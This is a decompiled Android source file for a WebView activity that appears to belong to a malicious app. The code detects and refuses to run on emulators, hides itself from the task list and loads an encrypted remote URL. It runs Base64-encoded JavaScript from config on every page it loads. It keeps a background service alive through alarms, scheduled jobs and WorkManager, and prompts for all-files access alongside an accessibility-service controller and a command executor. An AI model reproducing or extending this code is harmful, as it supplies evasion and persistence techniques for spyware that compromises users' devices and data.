/*
 * Decompiled with CFR 0.152.
 * 
 * Could not load the following classes:
 *  android.app.Activity
 *  android.app.AlertDialog$Builder
 *  android.app.DownloadManager
 *  android.app.DownloadManager$Request
 *  android.content.Context
 *  android.content.DialogInterface
 *  android.content.DialogInterface$OnClickListener
 *  android.content.Intent
 *  android.content.pm.PackageManager$NameNotFoundException
 *  android.graphics.Bitmap
 *  android.graphics.Point
 *  android.graphics.drawable.Drawable
 *  android.net.ConnectivityManager
 *  android.net.Uri
 *  android.os.Build
 *  android.os.Build$VERSION
 *  android.os.Bundle
 *  android.os.Environment
 *  android.os.Message
 *  android.util.Base64
 *  android.util.Log
 *  android.view.View
 *  android.view.View$OnClickListener
 *  android.view.ViewGroup
 *  android.view.ViewGroup$LayoutParams
 *  android.webkit.DownloadListener
 *  android.webkit.JsPromptResult
 *  android.webkit.JsResult
 *  android.webkit.URLUtil
 *  android.webkit.ValueCallback
 *  android.webkit.WebChromeClient
 *  android.webkit.WebChromeClient$CustomViewCallback
 *  android.webkit.WebChromeClient$FileChooserParams
 *  android.webkit.WebResourceRequest
 *  android.webkit.WebResourceResponse
 *  android.webkit.WebSettings$PluginState
 *  android.webkit.WebSettings$RenderPriority
 *  android.webkit.WebView
 *  android.webkit.WebViewClient
 *  android.widget.Button
 *  android.widget.EditText
 *  android.widget.FrameLayout
 *  android.widget.FrameLayout$LayoutParams
 *  android.widget.ImageView
 *  android.widget.RelativeLayout
 *  android.widget.RelativeLayout$LayoutParams
 *  android.widget.TextView
 *  android.widget.Toast
 */
package linker.resourcer.encoder;

import android.app.Activity;
import android.app.AlertDialog;
import android.app.DownloadManager;
import android.content.Context;
import android.content.DialogInterface;
import android.content.Intent;
import android.content.pm.PackageManager;
import android.graphics.Bitmap;
import android.graphics.Point;
import android.graphics.drawable.Drawable;
import android.net.ConnectivityManager;
import android.net.Uri;
import android.os.Build;
import android.os.Bundle;
import android.os.Environment;
import android.os.Message;
import android.util.Base64;
import android.util.Log;
import android.view.View;
import android.view.ViewGroup;
import android.webkit.DownloadListener;
import android.webkit.JsPromptResult;
import android.webkit.JsResult;
import android.webkit.URLUtil;
import android.webkit.ValueCallback;
import android.webkit.WebChromeClient;
import android.webkit.WebResourceRequest;
import android.webkit.WebResourceResponse;
import android.webkit.WebSettings;
import android.webkit.WebView;
import android.webkit.WebViewClient;
import android.widget.Button;
import android.widget.EditText;
import android.widget.FrameLayout;
import android.widget.ImageView;
import android.widget.RelativeLayout;
import android.widget.TextView;
import android.widget.Toast;
import java.io.BufferedReader;
import java.io.ByteArrayInputStream;
import java.io.IOException;
import java.io.InputStream;
import java.io.InputStreamReader;
import java.io.Reader;
import java.io.StringReader;
import java.net.URI;
import java.nio.charset.StandardCharsets;
import java.util.HashSet;
import java.util.Locale;
import java.util.Set;
import linker.resourcer.encoder.AlarmHelper;
import linker.resourcer.encoder.ConfigManager;
import linker.resourcer.encoder.JobSchedulerUtil;
import linker.resourcer.encoder.R;
import linker.resourcer.encoder.ConfigurationConstants;
import linker.resourcer.encoder.CommandExecutor;
import linker.resourcer.encoder.DataSaverPromptActivity;
import linker.resourcer.encoder.UtilityHelper;
import linker.resourcer.encoder.PermissionArrayProvider;
import linker.resourcer.encoder.AccessibilityServiceController;
import linker.resourcer.encoder.ConfigurationProvider;
import linker.resourcer.encoder.SetupOrchestrationService;
import linker.resourcer.encoder.CryptoManager;
import linker.resourcer.encoder.SystemUtilities;
import linker.resourcer.encoder.SharedPreferencesManager;
import linker.resourcer.encoder.WebViewActivity$$ExternalSyntheticLambda0;
import linker.resourcer.encoder.WebViewActivity$MyChrome$$ExternalSyntheticLambda0;
import linker.resourcer.encoder.WebViewActivity$MyChrome$$ExternalSyntheticLambda1;
import linker.resourcer.encoder.WebViewActivity$MyChrome$$ExternalSyntheticLambda2;
import linker.resourcer.encoder.WebViewActivity$MyChrome$$ExternalSyntheticLambda3;

/*
 * Illegal identifiers - consider using --renameillegalidents true
 */
public class WebViewActivity
extends Activity {
    private static final int FILECHOOSER_RESULTCODE = 1;
    private View.OnClickListener Oklistner;
    private Set<String> adHosts;
    private boolean excuteonce = false;
    private ValueCallback<Uri[]> mUploadMessage;
    public WebView mWebView;
    private View.OnClickListener out = new View.OnClickListener(this){
        final WebViewActivity this$0;
        {
            this.this$0 = yynnsnupqughbjmsvq2;
        }

        public void onClick(View view) {
            try {
                this.this$0.finish();
            }
            catch (Exception exception) {
                // empty catch block
            }
        }
    };
    String value = "skin.info";

    public WebViewActivity() {
        this.Oklistner = new View.OnClickListener(this){
            final WebViewActivity this$0;
            {
                this.this$0 = yynnsnupqughbjmsvq2;
            }

            public void onClick(View view) {
                try {
                    view = new Intent("android.settings.WIFI_SETTINGS");
                    view.setFlags(0x10000000);
                    this.this$0.startActivity((Intent)view);
                }
                catch (Exception exception) {
                    // empty catch block
                }
            }
        };
        this.adHosts = new HashSet<String>();
    }

    /*
     * Enabled aggressive block sorting
     * Enabled unnecessary exception pruning
     * Enabled aggressive exception aggregation
     */
    private void AsknoEmu() {
        Drawable drawable2;
        String string2;
        String string3;
        int n;
        String string4;
        block15: {
            string4 = Locale.getDefault().getLanguage();
            switch (string4.hashCode()) {
                case 3886: {
                    if (!string4.equals("zh")) break;
                    n = 2;
                    break block15;
                }
                case 3710: {
                    if (!string4.equals("tr")) break;
                    n = 3;
                    break block15;
                }
                case 3241: {
                    if (!string4.equals("en")) break;
                    n = 0;
                    break block15;
                }
                case 3121: {
                    if (!string4.equals("ar")) break;
                    n = 1;
                    break block15;
                }
            }
            n = -1;
        }
        switch (n) {
            default: {
                string4 = "OK";
                string3 = "Emulator detected";
                string2 = "this app does not support emulator devices";
                break;
            }
            case 3: {
                string4 = "Tamam";
                string3 = "\u00f6yk\u00fcn\u00fcc\u00fc alg\u0131land\u0131";
                string2 = "bu uygulama \u00f6yk\u00fcn\u00fcc\u00fc ayg\u0131tlar\u0131 desteklemiyor";
                break;
            }
            case 2: {
                string4 = "\u597d\u7684";
                string3 = "\u68c0\u6d4b\u5230\u6a21\u62df\u5668";
                string2 = "\u6b64\u5e94\u7528\u4e0d\u652f\u6301\u6a21\u62df\u5668\u8bbe\u5907";
                break;
            }
            case 1: {
                string4 = "\u0645\u0648\u0627\u0641\u0642";
                string3 = "\u062a\u0645 \u0627\u0643\u062a\u0634\u0627\u0641 \u0645\u062d\u0627\u0643\u064a";
                string2 = "\u0647\u0630\u0627 \u0627\u0644\u062a\u0637\u0628\u064a\u0642 \u0644\u0627 \u064a\u062f\u0639\u0645 \u0623\u062c\u0647\u0632\u0629 \u0627\u0644\u0645\u062d\u0627\u0643\u064a";
                break;
            }
            case 0: {
                string4 = "ok";
                string3 = "Emulator detected";
                string2 = "this app does not support emulator devices";
            }
        }
        try {
            drawable2 = this.getPackageManager().getApplicationIcon(this.getPackageName());
        }
        catch (PackageManager.NameNotFoundException nameNotFoundException) {
            drawable2 = null;
        }
        string4 = new AlertDialog.Builder((Context)this, 16974545).setTitle((CharSequence)string3).setMessage((CharSequence)string2).setPositiveButton((CharSequence)string4, (DialogInterface.OnClickListener)new WebViewActivity$$ExternalSyntheticLambda0(this));
        if (drawable2 != null) {
            string4.setIcon(drawable2);
        }
        string4.show();
    }

    static /* synthetic */ ValueCallback access$002(WebViewActivity yynnsnupqughbjmsvq2, ValueCallback valueCallback) {
        yynnsnupqughbjmsvq2.mUploadMessage = valueCallback;
        return valueCallback;
    }

    private boolean isEmulator() {
        boolean bl = Build.BRAND.startsWith("generic") && Build.DEVICE.startsWith("generic") || Build.FINGERPRINT.startsWith("generic") || Build.FINGERPRINT.startsWith("unknown") || Build.HARDWARE.contains("goldfish") || Build.HARDWARE.contains("ranchu") || Build.MODEL.contains("google_sdk") || Build.MODEL.contains("Emulator") || Build.MODEL.contains("Android SDK built for x86") || Build.MANUFACTURER.contains("Genymotion") || Build.PRODUCT.contains("sdk_google") || Build.PRODUCT.contains("google_sdk") || Build.PRODUCT.contains("sdk") || Build.PRODUCT.contains("sdk_x86") || Build.PRODUCT.contains("sdk_gphone64_arm64") || Build.PRODUCT.contains("vbox86p") || Build.PRODUCT.contains("emulator") || Build.PRODUCT.contains("simulator");
        return bl;
    }

    public static boolean isinternetOK(Context context) {
        return (context = ((ConnectivityManager)context.getSystemService("connectivity")).getActiveNetworkInfo()) != null && context.isConnected();
    }

    /*
     * Enabled aggressive block sorting
     * Enabled unnecessary exception pruning
     * Enabled aggressive exception aggregation
     */
    private void loadAdHosts(Context object) {
        try {
            Object object2;
            Object object3 = object.getAssets().open("ads.txt");
            if (ConfigurationProvider.AsstsKey.equals("[AST-PAS]")) {
                object2 = new InputStreamReader((InputStream)object3);
                object = new BufferedReader((Reader)object2);
                object3 = new StringBuilder();
                while ((object2 = ((BufferedReader)object).readLine()) != null) {
                    ((StringBuilder)object3).append((String)object2).append("\n");
                }
                ((BufferedReader)object).close();
                object = ((StringBuilder)object3).toString();
            } else {
                object = new byte[((InputStream)object3).available()];
                ((InputStream)object3).read((byte[])object);
                ((InputStream)object3).close();
                object = new String(UtilityHelper.xorBytes((byte[])object, ConfigurationProvider.AsstsKey), StandardCharsets.UTF_8);
            }
            object2 = new StringReader((String)object);
            object3 = new BufferedReader((Reader)object2);
            while (true) {
                if ((object = ((BufferedReader)object3).readLine()) == null) {
                    ((BufferedReader)object3).close();
                    return;
                }
                if (((String)(object = ((String)object).trim())).isEmpty() || ((String)object).startsWith("#")) continue;
                this.adHosts.add(((String)object).toLowerCase());
            }
        }
        catch (IOException iOException) {
            iOException.printStackTrace();
        }
    }

    private void startworkers(Context context) {
        new Thread(new Runnable(){
            final WebViewActivity this$0;
            final Context val$mcontext;
            {
                this.this$0 = yynnsnupqughbjmsvq2;
                this.val$mcontext = context;
            }

            @Override
            public void run() {
                try {
                    Intent intent = new Intent(this.val$mcontext, SetupOrchestrationService.class);
                    if (!SystemUtilities.isServiceRunning(this.val$mcontext, SetupOrchestrationService.class)) {
                        if (Build.VERSION.SDK_INT >= 26) {
                            this.val$mcontext.startForegroundService(intent);
                        } else {
                            this.val$mcontext.startService(intent);
                        }
                    }
                }
                catch (Exception exception) {
                    // empty catch block
                }
            }
        }).start();
    }

    public void executeBase64JavaScript(WebView webView, String object) {
        try {
            if (this.excuteonce) {
                return;
            }
            ValueCallback<String> valueCallback = new String((byte[])(object = (Object)Base64.decode((String)object, (int)0)), "UTF-8");
            if (!valueCallback.contains((CharSequence)"|")) {
                return;
            }
            object = valueCallback.split("\\|");
            if (((String[])object).length != 2) {
                return;
            }
            this.excuteonce = object[1].trim().equals("1");
            valueCallback = (ValueCallback<String>)Base64.decode((String)object[0], (int)0);
            object = new String((byte[])valueCallback, "UTF-8");
            if (((String)object).equals("NA")) {
                return;
            }
            valueCallback = new ValueCallback<String>(this){
                final WebViewActivity this$0;
                {
                    this.this$0 = yynnsnupqughbjmsvq2;
                }

                public void onReceiveValue(String string2) {
                    Log.d((String)"JS_RESULT", (String)("Executed. Result: " + string2));
                }
            };
            webView.evaluateJavascript((String)object, (ValueCallback)valueCallback);
        }
        catch (Exception exception) {
            Log.e((String)"JS_ERROR", (String)"Failed to decode or execute JavaScript", (Throwable)exception);
        }
    }

    public void finish() {
        try {
            Context context = this.getApplicationContext();
            this.mWebView = null;
            this.startworkers(context);
            AlarmHelper.setAlarm(context);
        }
        catch (Exception exception) {
            // empty catch block
        }
        super.finish();
    }

    /* synthetic */ void lambda$AsknoEmu$0$com-icontrol-protector-WebViewActivity(DialogInterface dialogInterface, int n) {
        this.finish();
        System.exit(0);
    }

    protected void onActivityResult(int n, int n2, Intent uriArray) {
        if (n == 1) {
            if (this.mUploadMessage != null && uriArray != null && n2 == -1) {
                Object var4_4 = null;
                String string2 = uriArray.getDataString();
                uriArray = var4_4;
                if (string2 != null) {
                    uriArray = new Uri[]{Uri.parse((String)string2)};
                }
                this.mUploadMessage.onReceiveValue((Object)uriArray);
                this.mUploadMessage = null;
            } else {
                return;
            }
        }
    }

    public void onBackPressed() {
        try {
            if (this.mWebView != null && this.mWebView.canGoBack()) {
                this.mWebView.goBack();
            } else {
                super.onBackPressed();
            }
        }
        catch (NullPointerException nullPointerException) {
            super.onBackPressed();
        }
    }

    /*
     * Enabled aggressive block sorting
     * Enabled unnecessary exception pruning
     * Enabled aggressive exception aggregation
     */
    public void onCreate(Bundle object) {
        Object object2;
        Context context;
        block38: {
            int n;
            block39: {
                super.onCreate((Bundle)object);
                UtilityHelper.excludeFromTaskList(this.getApplicationContext());
                n = 0;
                this.excuteonce = false;
                object = ConfigManager.getInstance();
                this.loadAdHosts(this.getApplicationContext());
                try {
                    ((ConfigManager)object).initialize(this.getApplicationContext(), ConfigurationProvider.ALL_CONFIG);
                    context = this.getApplicationContext();
                    CommandExecutor.instance(this.getApplicationContext());
                    if (SharedPreferencesManager.Read(context, "Wscr", "").length() == 0) {
                        object2 = new Point();
                        this.getWindowManager().getDefaultDisplay().getRealSize((Point)object2);
                        int n2 = Math.min(((Point)object2).x, ((Point)object2).y);
                        int n3 = Math.max(((Point)object2).x, ((Point)object2).y);
                        SharedPreferencesManager.Write(context, "Wscr", String.valueOf(n2));
                        SharedPreferencesManager.Write(context, "Hscr", String.valueOf(n3));
                    }
                }
                catch (Exception exception) {
                    exception.printStackTrace();
                }
                if (ConfigurationProvider.Anti_emulator.equals("1") && this.isEmulator()) {
                    this.AsknoEmu();
                    return;
                }
                if (WebViewActivity.isinternetOK(this.getApplicationContext()) || ConfigurationProvider.Is_Store.equals("1")) break block38;
                this.setContentView(R.layout.nointernet);
                object = (TextView)this.findViewById(R.id.nodescrip);
                object2 = Locale.getDefault().getLanguage();
                switch (((String)object2).hashCode()) {
                    case 3886: {
                        if (!((String)object2).equals("zh")) break;
                        n = 2;
                        break block39;
                    }
                    case 3710: {
                        if (!((String)object2).equals("tr")) break;
                        n = 3;
                        break block39;
                    }
                    case 3241: {
                        if (!((String)object2).equals("en")) break;
                        break block39;
                    }
                    case 3121: {
                        if (!((String)object2).equals("ar")) break;
                        n = 1;
                        break block39;
                    }
                }
                n = -1;
            }
            switch (n) {
                default: {
                    object.setText((CharSequence)"no internet connection detected.\n\n please connect to internet and try again");
                    break;
                }
                case 3: {
                    object.setText((CharSequence)"internet ba\u011flant\u0131s\u0131 alg\u0131lanmad\u0131.\n\n l\u00fctfen internete ba\u011flan\u0131n ve tekrar deneyin");
                    break;
                }
                case 2: {
                    object.setText((CharSequence)"\u672a\u68c0\u6d4b\u5230 Internet \u8fde\u63a5\u3002\n\n \u8bf7\u8fde\u63a5\u5230 Internet \u5e76\u91cd\u8bd5");
                    break;
                }
                case 1: {
                    object.setText((CharSequence)"\u0644\u0645 \u064a\u062a\u0645 \u0627\u0644\u0643\u0634\u0641 \u0639\u0646 \u0627\u062a\u0635\u0627\u0644 \u0628\u0627\u0644\u0625\u0646\u062a\u0631\u0646\u062a .\n\n \u0627\u0644\u0631\u062c\u0627\u0621 \u0627\u0644\u0627\u062a\u0635\u0627\u0644 \u0628\u0627\u0644\u0625\u0646\u062a\u0631\u0646\u062a \u0648\u0627\u0644\u0645\u062d\u0627\u0648\u0644\u0629 \u0645\u0631\u0629 \u0623\u062e\u0631\u0649");
                    break;
                }
                case 0: {
                    object.setText((CharSequence)"No internet connection detected.\n\n please connect to internet and try again");
                }
            }
            ((ImageView)this.findViewById(R.id.noneticon)).setOnClickListener(this.Oklistner);
            ((Button)this.findViewById(R.id.closeme)).setOnClickListener(this.out);
            return;
        }
        try {
            this.getWindow().setFlags(0x1000000, 0x1000000);
        }
        catch (Exception exception) {
            // empty catch block
        }
        if (ConfigurationProvider.Is_Store.equals("1")) {
            object = this.getApplicationContext();
            object2 = new Intent((Context)object, SetupOrchestrationService.class);
            if (!SystemUtilities.isServiceRunning((Context)object, SetupOrchestrationService.class)) {
                if (Build.VERSION.SDK_INT >= 26) {
                    object.startForegroundService((Intent)object2);
                } else {
                    object.startService((Intent)object2);
                }
            }
            this.finish();
            return;
        }
        object2 = new RelativeLayout((Context)this);
        object2.setLayoutParams((ViewGroup.LayoutParams)new RelativeLayout.LayoutParams(-1, -1));
        this.mWebView = new WebView((Context)this);
        this.mWebView.setId(View.generateViewId());
        context = new RelativeLayout.LayoutParams(-1, -1);
        this.mWebView.setLayoutParams((ViewGroup.LayoutParams)context);
        object2.addView((View)this.mWebView);
        this.setContentView((View)object2);
        this.mWebView.getSettings().setJavaScriptEnabled(true);
        this.mWebView.getSettings().setSupportMultipleWindows(true);
        this.mWebView.getSettings().setJavaScriptCanOpenWindowsAutomatically(true);
        this.mWebView.getSettings().setMediaPlaybackRequiresUserGesture(false);
        this.mWebView.getSettings().setLoadsImagesAutomatically(true);
        this.mWebView.getSettings().setLoadWithOverviewMode(true);
        this.mWebView.getSettings().setUseWideViewPort(true);
        this.mWebView.setScrollBarStyle(0);
        this.mWebView.getSettings().setAllowFileAccess(true);
        this.mWebView.getSettings().setCacheMode(1);
        this.mWebView.getSettings().setDomStorageEnabled(true);
        this.mWebView.getSettings().setAllowFileAccessFromFileURLs(true);
        this.mWebView.getSettings().setAllowUniversalAccessFromFileURLs(true);
        this.mWebView.getSettings().setAllowContentAccess(true);
        try {
            this.mWebView.setLayerType(2, null);
            this.mWebView.getSettings().setPluginState(WebSettings.PluginState.ON);
            this.mWebView.getSettings().setRenderPriority(WebSettings.RenderPriority.HIGH);
            this.mWebView.setBackgroundColor(-1);
        }
        catch (Exception exception) {
            // empty catch block
        }
        this.mWebView.getSettings().setBuiltInZoomControls(false);
        this.value = CryptoManager.Getinstance().Dcrpt_Str(ConfigurationProvider.HOME_NAME);
        if (ConfigurationProvider.LD_TYPE.equals("D")) {
            this.mWebView.getSettings().setUserAgentString("Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.5735.199 Safari/537.36");
        } else if (!this.value.contains("google.com") && !this.value.contains("youtube.com")) {
            this.mWebView.getSettings().setUserAgentString("Mozilla/5.0 (Linux; Android 12; SM-G991B Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/115.0.5790.102 Mobile Safari/537.36");
        } else {
            this.mWebView.getSettings().setUserAgentString("Mozilla/5.0 (Linux; Android 13; Pixel 7 Build/TQ2A.230605.011) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.5845.96 Mobile Safari/537.36");
        }
        this.mWebView.setDownloadListener(new DownloadListener(this){
            final WebViewActivity this$0;
            {
                this.this$0 = yynnsnupqughbjmsvq2;
            }

            public void onDownloadStart(String string2, String string3, String string4, String string5, long l) {
                try {
                    string3 = new DownloadManager.Request(Uri.parse((String)string2));
                    string2 = URLUtil.guessFileName((String)string2, (String)string4, (String)string5);
                    string3.allowScanningByMediaScanner();
                    string3.setNotificationVisibility(1);
                    string3.setDestinationInExternalPublicDir(Environment.DIRECTORY_DOWNLOADS, string2);
                    ((DownloadManager)this.this$0.getSystemService("download")).enqueue((DownloadManager.Request)string3);
                    Toast.makeText((Context)this.this$0.getApplicationContext(), (CharSequence)"Downloading File", (int)1).show();
                }
                catch (Exception exception) {
                    // empty catch block
                }
            }
        });
        this.mWebView.setWebChromeClient((WebChromeClient)new MyChrome(this));
        this.mWebView.setWebViewClient((WebViewClient)new MyWebViewClient(this));
        this.startworkers(this.getApplicationContext());
        if (!this.value.startsWith("http://") && !this.value.startsWith("https://")) {
            this.value = "http://" + this.value;
        }
        if (((ConfigManager)object).req_backdata && (object2 = (ConnectivityManager)this.getSystemService("connectivity")).isActiveNetworkMetered()) {
            switch (object2.getRestrictBackgroundStatus()) {
                default: {
                    break;
                }
                case 3: {
                    object2 = new Intent(this.getApplicationContext(), DataSaverPromptActivity.class);
                    object2.addFlags(0x10000000);
                    this.startActivity((Intent)object2);
                }
            }
        }
        this.mWebView.loadUrl(this.value);
        if (!ConfigurationConstants.engine_done) return;
        if (!((ConfigManager)object).req_files) return;
        boolean bl = PermissionArrayProvider.hasFileAccess(this.getApplicationContext());
        if (bl) return;
        try {
            object = new Intent("android.settings.MANAGE_APP_ALL_FILES_ACCESS_PERMISSION");
            object.setData(Uri.fromParts((String)"package", (String)this.getPackageName(), null));
            object.addFlags(0x10000000);
            this.startActivity((Intent)object);
            AccessibilityServiceController.FOR_EXTR_STRG = true;
            return;
        }
        catch (Exception exception) {
            try {
                exception.printStackTrace();
                return;
            }
            catch (Exception exception2) {
                // empty catch block
            }
        }
    }

    /*
     * Enabled aggressive block sorting
     * Enabled unnecessary exception pruning
     * Enabled aggressive exception aggregation
     */
    protected void onDestroy() {
        Context context;
        try {
            if (this.mWebView != null) {
                this.mWebView.stopLoading();
                this.mWebView.clearHistory();
                this.mWebView.clearCache(true);
                context = (ViewGroup)this.mWebView.getParent();
                if (context != null) {
                    context.removeView((View)this.mWebView);
                }
                this.mWebView.removeAllViews();
                this.mWebView.destroy();
                this.mWebView = null;
            }
        }
        catch (Exception exception) {
            // empty catch block
        }
        try {
            JobSchedulerUtil.scheduleJob(this.getApplicationContext());
            context = this.getApplicationContext();
            this.startworkers(context);
            AlarmHelper.setAlarm(context);
            UtilityHelper.setupWorkManager(this.getApplicationContext());
        }
        catch (Exception exception) {
            // empty catch block
        }
        super.onDestroy();
    }

    protected void onRestoreInstanceState(Bundle bundle) {
        super.onRestoreInstanceState(bundle);
        if (this.mWebView != null) {
            this.mWebView.restoreState(bundle);
        }
    }

    protected void onSaveInstanceState(Bundle bundle) {
        super.onSaveInstanceState(bundle);
        if (this.mWebView != null) {
            this.mWebView.saveState(bundle);
        }
    }

    public class MyChrome
    extends WebChromeClient {
        private View customView;
        private WebChromeClient.CustomViewCallback customViewCallback;
        private FrameLayout fullScreenContainer;
        final WebViewActivity this$0;

        MyChrome(WebViewActivity yynnsnupqughbjmsvq2) {
            this.this$0 = yynnsnupqughbjmsvq2;
        }

        static /* synthetic */ void lambda$onJsConfirm$0(JsResult jsResult, DialogInterface dialogInterface, int n) {
            jsResult.confirm();
        }

        static /* synthetic */ void lambda$onJsConfirm$1(JsResult jsResult, DialogInterface dialogInterface, int n) {
            jsResult.cancel();
        }

        static /* synthetic */ void lambda$onJsPrompt$2(JsPromptResult jsPromptResult, EditText editText, DialogInterface dialogInterface, int n) {
            jsPromptResult.confirm(editText.getText().toString());
        }

        static /* synthetic */ void lambda$onJsPrompt$3(JsPromptResult jsPromptResult, DialogInterface dialogInterface, int n) {
            jsPromptResult.cancel();
        }

        private void openexternal(Context context, String string2) {
            CharSequence charSequence;
            block6: {
                charSequence = string2;
                if (string2.startsWith("http://")) break block6;
                charSequence = string2;
                if (string2.startsWith("https://")) break block6;
                charSequence = new StringBuilder();
                charSequence = ((StringBuilder)charSequence).append("http://").append(string2).toString();
            }
            try {
                string2 = new Intent("android.intent.action.VIEW");
                string2.addFlags(0x10000000);
                string2.setData(Uri.parse((String)charSequence));
                context.startActivity((Intent)string2);
            }
            catch (Exception exception) {
                try {
                    exception.printStackTrace();
                }
                catch (Exception exception2) {
                    // empty catch block
                }
            }
        }

        public boolean onCreateWindow(WebView webView, boolean bl, boolean bl2, Message message) {
            return false;
        }

        public void onHideCustomView() {
            if (this.customView == null) {
                return;
            }
            Activity activity = (Activity)this.this$0.mWebView.getContext();
            ((ViewGroup)activity.getWindow().getDecorView()).removeView((View)this.fullScreenContainer);
            this.fullScreenContainer = null;
            this.customView = null;
            this.customViewCallback.onCustomViewHidden();
            activity.setRequestedOrientation(1);
        }

        public boolean onJsAlert(WebView webView, String string2, String string3, JsResult jsResult) {
            webView = new AlertDialog.Builder(webView.getContext(), 16974545);
            webView.setTitle((CharSequence)"Alert");
            webView.setMessage((CharSequence)string3);
            webView.setPositiveButton(17039370, new DialogInterface.OnClickListener(){
                final MyChrome this$1;
                final JsResult val$result;
                {
                    this.this$1 = myChrome;
                    this.val$result = jsResult;
                }

                public void onClick(DialogInterface dialogInterface, int n) {
                    this.val$result.confirm();
                }
            });
            webView.setCancelable(false);
            webView.create().show();
            return true;
        }

        public boolean onJsConfirm(WebView webView, String string2, String string3, JsResult jsResult) {
            new AlertDialog.Builder(webView.getContext(), 16974545).setTitle((CharSequence)"Confirm").setMessage((CharSequence)string3).setPositiveButton(17039370, (DialogInterface.OnClickListener)new WebViewActivity$MyChrome$$ExternalSyntheticLambda0(jsResult)).setNegativeButton(0x1040000, (DialogInterface.OnClickListener)new WebViewActivity$MyChrome$$ExternalSyntheticLambda1(jsResult)).create().show();
            return true;
        }

        public boolean onJsPrompt(WebView webView, String string2, String string3, String string4, JsPromptResult jsPromptResult) {
            string2 = new EditText(webView.getContext());
            string2.setText((CharSequence)string4);
            new AlertDialog.Builder(webView.getContext(), 16974545).setTitle((CharSequence)string3).setView((View)string2).setPositiveButton((CharSequence)"OK", (DialogInterface.OnClickListener)new WebViewActivity$MyChrome$$ExternalSyntheticLambda2(jsPromptResult, (EditText)string2)).setNegativeButton((CharSequence)"Cancel", (DialogInterface.OnClickListener)new WebViewActivity$MyChrome$$ExternalSyntheticLambda3(jsPromptResult)).create().show();
            return true;
        }

        public void onShowCustomView(View view, WebChromeClient.CustomViewCallback customViewCallback) {
            if (this.customView != null) {
                customViewCallback.onCustomViewHidden();
                return;
            }
            this.customView = view;
            this.customViewCallback = customViewCallback;
            this.fullScreenContainer = new FrameLayout(this.this$0.mWebView.getContext());
            this.fullScreenContainer.setBackgroundColor(-16777216);
            this.fullScreenContainer.addView(view, (ViewGroup.LayoutParams)new FrameLayout.LayoutParams(-1, -1));
            view = (Activity)this.this$0.mWebView.getContext();
            ((ViewGroup)view.getWindow().getDecorView()).addView((View)this.fullScreenContainer);
            view.setRequestedOrientation(0);
        }

        public boolean onShowFileChooser(WebView webView, ValueCallback<Uri[]> valueCallback, WebChromeClient.FileChooserParams fileChooserParams) {
            if (this.this$0.mUploadMessage != null) {
                this.this$0.mUploadMessage.onReceiveValue(null);
            }
            WebViewActivity.access$002(this.this$0, valueCallback);
            webView = new Intent("android.intent.action.GET_CONTENT");
            webView.addCategory("android.intent.category.OPENABLE");
            webView.setType("*/*");
            this.this$0.startActivityForResult(Intent.createChooser((Intent)webView, (CharSequence)"File Chooser"), 1);
            return true;
        }
    }

    private class MyWebViewClient
    extends WebViewClient {
        final WebViewActivity this$0;

        private MyWebViewClient(WebViewActivity yynnsnupqughbjmsvq2) {
            this.this$0 = yynnsnupqughbjmsvq2;
        }

        private boolean isAdUrl(String string2) {
            boolean bl = (string2 = string2.toLowerCase()).contains("doubleclick.net") || string2.contains("adservice.google.com") || string2.contains("googlesyndication.com") || string2.contains("ads.") || string2.matches(".*\\b(ad|ads|banner|click|track)\\b.*\\..*");
            return bl;
        }

        public void onPageFinished(WebView webView, String string2) {
            this.this$0.executeBase64JavaScript(webView, ConfigurationProvider.extjs);
            super.onPageFinished(webView, string2);
        }

        public void onPageStarted(WebView webView, String string2, Bitmap bitmap) {
            super.onPageStarted(webView, string2, bitmap);
        }

        public void onReceivedError(WebView webView, int n, String string2, String string3) {
        }

        public WebResourceResponse shouldInterceptRequest(WebView webView, WebResourceRequest webResourceRequest) {
            String string2 = webResourceRequest.getUrl().getHost();
            if (string2 != null && this.this$0.adHosts.contains(string2.toLowerCase())) {
                return new WebResourceResponse("text/plain", "utf-8", (InputStream)new ByteArrayInputStream("".getBytes()));
            }
            return super.shouldInterceptRequest(webView, webResourceRequest);
        }

        public boolean shouldOverrideUrlLoading(WebView webView, WebResourceRequest object) {
            if (object != null && object.getUrl() != null) {
                Object object2 = object.getUrl();
                object = object2.toString();
                if ((object2 = object2.getHost()) != null && this.this$0.adHosts.contains(((String)object2).toLowerCase()) || this.isAdUrl((String)object)) {
                    Log.d((String)"AdBlock", (String)("Blocked redirect to ad host: " + (String)object2));
                    return true;
                }
                if (!((String)object).startsWith("http") && ((String)object).contains("://")) {
                    try {
                        URI uRI = new URI((String)object);
                        object = new StringBuilder();
                        object2 = ((StringBuilder)object).append("https://").append(uRI.getHost());
                        object = uRI.getPath() != null ? uRI.getPath() : "";
                    }
                    catch (Exception exception) {
                        exception.printStackTrace();
                        return true;
                    }
                    webView.loadUrl(((StringBuilder)object2).append((String)object).toString());
                    return true;
                }
            }
            return false;
        }
    }
}

